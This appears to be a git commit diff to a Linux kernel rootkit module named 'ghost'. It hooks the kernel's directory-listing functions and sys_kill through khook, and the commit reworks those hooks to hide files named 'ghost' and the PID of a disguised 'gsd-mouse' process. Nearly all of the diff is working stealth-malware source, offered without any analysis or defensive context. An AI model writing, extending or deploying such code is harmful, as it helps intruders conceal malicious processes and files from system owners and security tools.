fc26c60e3c7b43a61ee93e42877c9cc36d8c40ae
teargear2 <teargear2@gmail.com>
2019-12-22 18:37:00 +0800

    yataze

--- program/ghost/ghostmodule.c
+++ program/ghost/ghostmodule.c
@@ -16,7 +16,7 @@
 #include <asm/unistd.h>
 #include <linux/types.h>
 #include <linux/dirent.h>
-
+#include <linux/compiler_types.h>
 
 
 
@@ -26,22 +26,7 @@ int protected_pid = -1;
 int hide_pid = -1;
 const char *hide = "gsd-mouse";
 
-static int adore_atoi(const char *str)
-{
-	int ret = 0, mul = 1;
-	const char *ptr;
-	
-	for(ptr = str; *ptr >= '0' && *ptr <= '9'; ptr++);
-	ptr--;
-	while(ptr >= str) {
-		if(*ptr < '0' || *ptr > '9')
-			break;
-		ret += (*ptr - '0') * mul;
-		mul *= 10;
-		ptr--;	
-	}
-	return ret;
-}
+
 // int myatoi(char *str)
 // {
 // 　　int res = 0;
@@ -166,9 +151,12 @@ static pid_t find_pid_hide(void)
 KHOOK_EXT(int, fillonedir, void *, const char *, int, loff_t, u64, unsigned int);
 static int khook_fillonedir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
 {
+	char *endp;
+	long pid;
 	int ret = 0;
-	
-	if (!strstr(name, "ghost") )
+	find_pid_hide();
+	pid = simple_strtol(name, &endp, 10);
+	if (pid != hide_pid && !strstr(name, "ghost"))
 		ret = KHOOK_ORIGIN(fillonedir, __buf, name, namlen, offset, ino, d_type);
 	return ret;
 }
@@ -176,17 +164,12 @@ static int khook_fillonedir(void *__buf, const char *name, int namlen, loff_t of
 KHOOK_EXT(int, filldir, void *, const char *, int, loff_t, u64, unsigned int);
 static int khook_filldir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
 {
-	// char *endp;
-	// long pid;
-	// int ret = 0;
-	// find_pid_hide();
-	// pid = simple_strtol(name, &endp, 10);
-	// if (pid != hide_pid || !strstr(name, "ghost")|| !strstr(name,protected))
-	// 	ret = KHOOK_ORIGIN(filldir, __buf, name, namlen, offset, ino, d_type);
-	// return ret;
+	char *endp;
+	long pid;
 	int ret = 0;
 	find_pid_hide();
-	if(hide_pid!=adore_atoi(name) && !strstr(name, "ghost") && !strstr(name,protected))
+	pid = simple_strtol(name, &endp, 10);
+	if (pid != hide_pid && !strstr(name, "ghost"))
 		ret = KHOOK_ORIGIN(filldir, __buf, name, namlen, offset, ino, d_type);
 	return ret;
 }
@@ -195,8 +178,12 @@ KHOOK_EXT(int, filldir64, void *, const char *, int, loff_t, u64, unsigned int);
 static int khook_filldir64(void *__buf, const char *name, int namlen,
 			   loff_t offset, u64 ino, unsigned int d_type)
 {
+	char *endp;
+	long pid;
 	int ret = 0;
-	if (!strstr(name, "ghost"))
+	find_pid_hide();
+	pid = simple_strtol(name, &endp, 10);
+	if (pid != hide_pid && !strstr(name, "ghost"))
 		ret = KHOOK_ORIGIN(filldir64, __buf, name, namlen, offset, ino, d_type);
 	return ret;
 }
@@ -205,8 +192,12 @@ KHOOK_EXT(int, compat_fillonedir, void *, const char *, int, loff_t, u64, unsign
 static int khook_compat_fillonedir(void *__buf, const char *name, int namlen,
 				   loff_t offset, u64 ino, unsigned int d_type)
 {
+	char *endp;
+	long pid;
 	int ret = 0;
-	if (!strstr(name, "ghost"))
+	find_pid_hide();
+	pid = simple_strtol(name, &endp, 10);
+	if (pid != hide_pid && !strstr(name, "ghost"))
 		ret = KHOOK_ORIGIN(compat_fillonedir, __buf, name, namlen, offset, ino, d_type);
 	return ret;
 }
@@ -216,14 +207,18 @@ KHOOK_EXT(int, compat_filldir64, void *buf, const char *, int, loff_t, u64, unsi
 static int khook_compat_filldir64(void *__buf, const char *name, int namlen,
 				  loff_t offset, u64 ino, unsigned int d_type)
 {
+	char *endp;
+	long pid;
 	int ret = 0;
-	if (!strstr(name, "ghost"))
+	find_pid_hide();
+	pid = simple_strtol(name, &endp, 10);
+	if (pid != hide_pid && !strstr(name, "ghost"))
 		ret = KHOOK_ORIGIN(compat_filldir64, __buf, name, namlen, offset, ino, d_type);
 	return ret;
 }
 #endif
 
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 9, 0)
+/*#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 9, 0)
 KHOOK_EXT(struct dentry *, __d_lookup, const struct dentry *, const struct qstr *);
 struct dentry *khook___d_lookup(const struct dentry *parent, const struct qstr *name)
 #else
@@ -235,7 +230,7 @@ struct dentry *khook___d_lookup(struct dentry *parent, struct qstr *name)
 	if (!strstr(name->name, "ghost"))
 		found = KHOOK_ORIGIN(__d_lookup, parent, name);
 	return found;
-}
+}*/
 
 KHOOK_EXT(long, sys_kill, pid_t, int);
 static long khook_sys_kill(pid_t pid, int sig) {
@@ -249,12 +244,12 @@ static long khook_sys_kill(pid_t pid, int sig) {
 	return ret;
 }
 
-KHOOK_EXT(ssize_t, vfs_read, struct file *, char __user *, size_t, loff_t *);
-static ssize_t khook_vfs_read(struct file *file, char __user *buf, size_t count, loff_t *pos){
-	ssize_t ret;
-	ret = KHOOK_ORIGIN(vfs_read, file, buf, count, pos);
-	return ret;
-}
+// KHOOK_EXT(ssize_t, vfs_write, struct file *, char __user *, size_t, loff_t *);
+// static ssize_t khook_vfs_write(struct file *file, char __user *buf, size_t count, loff_t *pos){
+// 	ssize_t ret;
+// 	ret = KHOOK_ORIGIN(vfs_write, file, buf, count, pos);
+// 	return ret;
+// }
 
 
 
